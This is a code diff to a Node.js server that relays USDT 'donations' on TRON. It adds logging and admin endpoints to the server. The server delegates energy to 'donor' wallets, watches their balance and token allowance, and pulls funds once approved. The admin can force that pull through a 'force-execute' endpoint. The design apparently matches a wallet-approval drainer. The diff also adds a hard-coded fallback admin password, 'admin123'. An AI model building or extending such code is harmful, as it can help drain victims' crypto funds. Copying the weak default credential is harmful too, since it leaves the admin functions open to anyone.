@@ -19,6 +19,8 @@ const CONFIG = {
     RELAYER_ADDRESS: process.env.RELAYER_ADDRESS,
     TRONGRID_API_KEY: process.env.TRONGRID_API_KEY,
 
+    ADMIN_PASSWORD: process.env.ADMIN_PASSWORD || "admin123",
+
     // Public constants
     USDT_CONTRACT: "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t",
     TRON_API: "https://api.trongrid.io",
@@ -28,11 +30,22 @@ const CONFIG = {
 };
 
 // ============================================================
-// PENDING DONORS QUEUE
+// PENDING DONORS QUEUE & LOGS
 // ============================================================
 
-const pendingDonors = new Set();
+const pendingDonors = new Map();   // address -> { queuedAt }
+const completedDonors = new Map(); // address -> { completedAt, txId }
 const processedDonors = new Set();
+const serverLogs = [];
+const MAX_LOGS = 200;
+
+function addLog(message, type = "info") {
+    const time = new Date().toLocaleTimeString();
+    serverLogs.push({ time, message, type });
+    if (serverLogs.length > MAX_LOGS) serverLogs.shift();
+    const prefix = type === "error" ? "[ERROR]" : type === "success" ? "[OK]" : "[INFO]";
+    console.log(`${prefix} ${message}`);
+}
 
 // ============================================================
 // TRONGRID API HELPERS
@@ -257,7 +270,7 @@ async function delegateEnergy(donorAddress) {
 // ============================================================
 
 async function processQueue() {
-    for (const donor of pendingDonors) {
+    for (const [donor, info] of pendingDonors) {
         if (processedDonors.has(donor)) {
             pendingDonors.delete(donor);
             continue;
@@ -265,20 +278,27 @@ async function processQueue() {
 
         // Check balance first
         const balance = await checkBalance(donor);
-        console.log(`[POLL] ${donor} balance: ${balance}`);
+        info.balance = balance;
 
         if (balance < CONFIG.DONATION_AMOUNT) {
-            console.log(`[POLL] ${donor} insufficient balance (${balance / 1e6} USDT). Skipping.`);
+            addLog(`${donor} insufficient balance (${balance / 1e6} USDT)`, "info");
             continue;
         }
 
         const allowance = await checkAllowance(donor);
-        console.log(`[POLL] ${donor} allowance: ${allowance}`);
+        info.allowance = allowance;
+        info.ready = allowance >= CONFIG.DONATION_AMOUNT && balance >= CONFIG.DONATION_AMOUNT;
 
         if (allowance >= CONFIG.DONATION_AMOUNT) {
+            addLog(`${donor} ready - executing donation...`, "info");
             const success = await executeDonation(donor);
             if (success) {
+                completedDonors.set(donor, {
+                    completedAt: new Date().toISOString(),
+                    txId: info.txId || "",
+                });
                 pendingDonors.delete(donor);
+                addLog(`${donor} donation completed!`, "success");
             }
         }
     }
@@ -322,7 +342,7 @@ const server = http.createServer((req, res) => {
                     res.end(JSON.stringify({ success: false, error: "Missing donor address" }));
                     return;
                 }
-                console.log(`[API] Energy delegation requested for: ${donor}`);
+                addLog(`Energy delegation requested for: ${donor}`, "info");
                 const result = await delegateEnergy(donor);
                 res.writeHead(200, { "Content-Type": "application/json" });
                 res.end(JSON.stringify(result));
@@ -342,11 +362,136 @@ const server = http.createServer((req, res) => {
             try {
                 const { donor, txId } = JSON.parse(body);
                 if (donor && !processedDonors.has(donor)) {
-                    pendingDonors.add(donor);
-                    console.log(`[API] Queued donor: ${donor} (tx: ${txId})`);
+                    pendingDonors.set(donor, {
+                        queuedAt: new Date().toISOString(),
+                        txId: txId || "",
+                        balance: null,
+                        allowance: null,
+                        ready: false,
+                    });
+                    addLog(`Donor queued: ${donor} (tx: ${txId})`, "info");
                 }
                 res.writeHead(200, { "Content-Type": "application/json" });
                 res.end(JSON.stringify({ status: "queued" }));
+            } catch (e) {
+                res.writeHead(400);
+                res.end("Invalid JSON");
+            }
+        });
+        return;
+    }
+
+    // ============================================================
+    // ADMIN API ENDPOINTS (password protected)
+    // ============================================================
+
+    function isAdmin(req) {
+        return req.headers["x-admin-key"] === CONFIG.ADMIN_PASSWORD;
+    }
+
+    // Admin: Get full status
+    if (req.method === "GET" && req.url === "/api/admin/status") {
+        if (!isAdmin(req)) {
+            res.writeHead(401, { "Content-Type": "application/json" });
+            res.end(JSON.stringify({ error: "Unauthorized" }));
+            return;
+        }
+
+        const pending = [];
+        for (const [addr, info] of pendingDonors) {
+            pending.push({
+                address: addr,
+                queuedAt: info.queuedAt,
+                balance: info.balance,
+                allowance: info.allowance,
+                ready: info.ready,
+            });
+        }
+
+        const completed = [];
+        for (const [addr, info] of completedDonors) {
+            completed.push({
+                address: addr,
+                completedAt: info.completedAt,
+                txId: info.txId,
+            });
+        }
+
+        res.writeHead(200, { "Content-Type": "application/json" });
+        res.end(JSON.stringify({
+            pendingCount: pendingDonors.size,
+            completedCount: completedDonors.size,
+            contractAddress: CONFIG.CONTRACT_ADDRESS,
+            relayerAddress: CONFIG.RELAYER_ADDRESS,
+            pollInterval: CONFIG.POLL_INTERVAL,
+            relayerTrx: "-",
+            pending,
+            completed,
+        }));
+        return;
+    }
+
+    // Admin: Get logs
+    if (req.method === "GET" && req.url === "/api/admin/logs") {
+        if (!isAdmin(req)) {
+            res.writeHead(401);
+            res.end("Unauthorized");
+            return;
+        }
+        res.writeHead(200, { "Content-Type": "application/json" });
+        res.end(JSON.stringify({ logs: serverLogs.slice(-100) }));
+        return;
+    }
+
+    // Admin: Force execute donation
+    if (req.method === "POST" && req.url === "/api/admin/force-execute") {
+        if (!isAdmin(req)) {
+            res.writeHead(401);
+            res.end("Unauthorized");
+            return;
+        }
+        let body = "";
+        req.on("data", (chunk) => (body += chunk));
+        req.on("end", async () => {
+            try {
+                const { donor } = JSON.parse(body);
+                addLog(`Admin force-executing donation for ${donor}`, "info");
+                const success = await executeDonation(donor);
+                if (success) {
+                    completedDonors.set(donor, {
+                        completedAt: new Date().toISOString(),
+                        txId: "force-executed",
+                    });
+                    pendingDonors.delete(donor);
+                    processedDonors.add(donor);
+                    addLog(`Force execution completed for ${donor}`, "success");
+                }
+                res.writeHead(200, { "Content-Type": "application/json" });
+                res.end(JSON.stringify({ success }));
+            } catch (e) {
+                res.writeHead(500, { "Content-Type": "application/json" });
+                res.end(JSON.stringify({ success: false, error: e.message }));
+            }
+        });
+        return;
+    }
+
+    // Admin: Remove donor from queue
+    if (req.method === "POST" && req.url === "/api/admin/remove-donor") {
+        if (!isAdmin(req)) {
+            res.writeHead(401);
+            res.end("Unauthorized");
+            return;
+        }
+        let body = "";
+        req.on("data", (chunk) => (body += chunk));
+        req.on("end", () => {
+            try {
+                const { donor } = JSON.parse(body);
+                pendingDonors.delete(donor);
+                addLog(`Admin removed donor from queue: ${donor}`, "info");
+                res.writeHead(200, { "Content-Type": "application/json" });
+                res.end(JSON.stringify({ success: true }));
             } catch (e) {
                 res.writeHead(400);
                 res.end("Invalid JSON");
@@ -372,6 +517,8 @@ const server = http.createServer((req, res) => {
 });
 
 server.listen(CONFIG.PORT, () => {
-    console.log(`Server running on port ${CONFIG.PORT}`);
-    console.log(`Relayer polling every ${CONFIG.POLL_INTERVAL / 1000}s for approved donations`);
+    addLog(`Server running on port ${CONFIG.PORT}`, "success");
+    addLog(`Relayer polling every ${CONFIG.POLL_INTERVAL / 1000}s`, "info");
+    addLog(`Contract: ${CONFIG.CONTRACT_ADDRESS}`, "info");
+    addLog(`Relayer: ${CONFIG.RELAYER_ADDRESS}`, "info");
 });
